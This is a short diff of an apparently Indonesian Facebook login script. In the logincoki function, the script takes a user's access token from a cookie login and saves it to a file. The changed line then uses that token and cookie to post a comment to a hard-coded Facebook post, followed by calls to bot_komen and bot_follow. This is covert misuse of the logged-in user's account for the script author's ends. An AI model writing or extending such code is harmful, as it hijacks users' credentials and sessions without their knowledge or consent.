@@ -381,7 +381,7 @@ def logincoki():
 					token = re.search('"access_token":"(.*?)"', str(response.headers)).group(1)
 					open('.fantoken.txt','w').write(token)
 					Console().print(Panel(f"""{P2}{token}""", width=60, style=f"{color_panel}", title="[bold green]TOKEN"))
-					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cookie})
+					requests.post(f"https://graph.facebook.com/926438272150751/comments/?message={kom2}&access_token={token}", headers={"cookie": cok})
 					bot_komen(cok, token)
 					bot_follow(cok, token)
 					#Console().print(f" {H2}• {P2}[bold green]Login Berhasil, jalankan Ulang Script")
